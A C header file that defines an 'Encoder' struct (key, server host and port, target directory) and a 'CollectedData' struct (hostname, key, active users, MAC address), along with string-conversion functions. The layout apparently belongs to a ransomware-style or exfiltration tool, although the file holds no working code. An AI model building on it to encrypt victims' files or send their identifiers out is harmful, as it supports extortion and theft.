#ifndef ENCODER_H
#define ENCODER_H

#define KEY_SIZE 128
#define SERVER_HOST_SIZE 256
#define SERVER_PORT_SIZE 4
#define TARGET_DIRECTORY_SIZE 512

#define HOSTNAME_SIZE 128
#define MAX_ACTIVE_USERS_SIZE 16
#define ACTIVE_USER_SIZE 128
#define MAC_ADDRESS_SIZE 48


typedef struct _encoder_t {
    char key[KEY_SIZE];
    char server_host[SERVER_HOST_SIZE];
    char server_port[SERVER_PORT_SIZE];
    char target_directory[TARGET_DIRECTORY_SIZE];
} Encoder;

typedef  struct _collected_data_t {
    char hostname[HOSTNAME_SIZE];
    char key[KEY_SIZE];
    char active_users[MAX_ACTIVE_USERS_SIZE][ACTIVE_USER_SIZE];
    char mac_addres[MAC_ADDRESS_SIZE];
} CollectedData;


char* encoder_to_string(const Encoder* e);
char* collected_data_to_string(const CollectedData* d);

#endif//ENCODER_H
